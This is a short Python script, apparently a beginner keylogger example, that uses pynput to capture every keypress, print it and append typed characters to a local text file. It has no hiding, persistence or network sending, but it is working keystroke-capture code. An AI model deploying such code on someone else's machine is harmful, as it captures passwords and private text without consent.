from pynput import keyboard #capture key events from user

def keyPressed(key): #on_press automatically passes in key (default)
    print(str(key)) #print the key to ourself
    #now writing all key events to a textfile
    with open("keyfile.txt", "a") as logKey: #opening/make a file (a is appending to file)
            #converting key to character to put in file
            try:
                char = key.char
                logKey.write(char)
            except:
                print("Error getting char")

if __name__ == "__main__":
    #everytime a key is pressed pass that information to keyPressed
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input() #asking people for strings
